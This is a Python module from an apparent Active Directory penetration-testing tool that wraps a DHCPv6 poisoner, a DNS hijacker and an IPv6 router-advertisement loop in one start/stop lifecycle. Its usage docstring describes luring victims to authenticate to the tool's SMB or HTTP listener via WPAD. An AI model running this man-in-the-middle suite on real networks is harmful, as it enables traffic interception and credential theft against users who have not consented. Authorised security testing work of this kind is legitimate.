"""MITM6Suite — composes DHCPv6 poisoner, DNS hijacker, and RA loop.

Mirrors the lifecycle pattern used by ``PoisoningSuite`` and the rest of
the relay layer: a single ``start()/stop()`` pair, atomic startup
(rollback on first failure) and best-effort shutdown.

Usage::

    from adscan_internal.services.mitm6 import MITM6Config, MITM6Suite

    config = MITM6Config(interface_name="eth0", local_domain="essos.local")
    suite = MITM6Suite(config)
    await suite.start()
    try:
        # victims authenticate to our SMB / HTTP listener via WPAD …
        ...
    finally:
        await suite.stop()
"""

from __future__ import annotations

import asyncio
import contextlib

from adscan_internal.rich_output import print_info_debug
from adscan_internal.services.mitm6.core import (
    MITM6Callback,
    MITM6Config,
    autodetect_interface_addresses,
)
from adscan_internal.services.mitm6.dhcpv6_poisoner import (
    DHCPv6Poisoner,
    send_router_advertisement_loop,
)
from adscan_internal.services.mitm6.dns_hijacker import DNSHijacker


class MITM6Suite:
    """Compose the three layers under one async lifecycle."""

    def __init__(
        self,
        config: MITM6Config,
        observation_callback: MITM6Callback = None,
    ) -> None:
        self._config = self._resolve_config(config)
        self._observation_callback = observation_callback
        self._dhcpv6 = DHCPv6Poisoner(self._config, observation_callback)
        self._dns = DNSHijacker(self._config, observation_callback)
        self._ra_stop_event = asyncio.Event()
        self._ra_task: asyncio.Task[None] | None = None

    @property
    def resolved_config(self) -> MITM6Config:
        """Return the post-autodetection config (useful for tests + logging)."""

        return self._config

    async def start(self) -> None:
        """Bring up DHCPv6 + DNS + (optionally) RA, atomically."""

        started: list[str] = []
        try:
            await self._dhcpv6.start()
            started.append("dhcpv6")
            await self._dns.start()
            started.append("dns")
            if self._config.send_router_advertisement:
                self._ra_stop_event.clear()
                self._ra_task = asyncio.create_task(
                    send_router_advertisement_loop(
                        self._config, stop_event=self._ra_stop_event
                    )
                )
                started.append("ra")
        except Exception:
            # Rollback in reverse order to avoid orphan sockets.
            if "ra" in started and self._ra_task is not None:
                self._ra_stop_event.set()
                self._ra_task.cancel()
                with contextlib.suppress(asyncio.CancelledError, Exception):
                    await self._ra_task
            if "dns" in started:
                with contextlib.suppress(Exception):
                    await self._dns.stop()
            if "dhcpv6" in started:
                with contextlib.suppress(Exception):
                    await self._dhcpv6.stop()
            raise

        print_info_debug(
            f"[mitm6-suite] started ({', '.join(started)}) on "
            f"{self._config.interface_name}"
        )

    async def stop(self) -> None:
        """Stop every layer (best-effort)."""

        self._ra_stop_event.set()
        if self._ra_task is not None:
            self._ra_task.cancel()
            with contextlib.suppress(asyncio.CancelledError, Exception):
                await self._ra_task
            self._ra_task = None
        await asyncio.gather(
            self._safe_stop(self._dns),
            self._safe_stop(self._dhcpv6),
            return_exceptions=True,
        )
        print_info_debug("[mitm6-suite] stopped")

    @staticmethod
    async def _safe_stop(component) -> None:
        with contextlib.suppress(Exception):
            await component.stop()

    @staticmethod
    def _resolve_config(config: MITM6Config) -> MITM6Config:
        """Auto-fill MAC/IPv4/IPv6 from the interface if blank."""

        needs_autodetect = (
            config.our_mac is None
            or config.our_ipv4 is None
            or config.our_ipv6_linklocal is None
        )
        if not needs_autodetect:
            return config

        detected = autodetect_interface_addresses(config.interface_name)
        if detected is None:
            raise RuntimeError(
                f"MITM6 cannot auto-detect addresses for "
                f"{config.interface_name!r} — set our_mac/our_ipv4/"
                "our_ipv6_linklocal explicitly or pick another interface."
            )
        mac, ipv4, ipv6 = detected
        # dataclass(frozen=True) — return a new instance with detected fields.
        from dataclasses import replace  # noqa: PLC0415

        return replace(
            config,
            our_mac=config.our_mac or mac,
            our_ipv4=config.our_ipv4 or ipv4,
            our_ipv6_linklocal=config.our_ipv6_linklocal or ipv6,
        )


__all__ = ["MITM6Suite"]
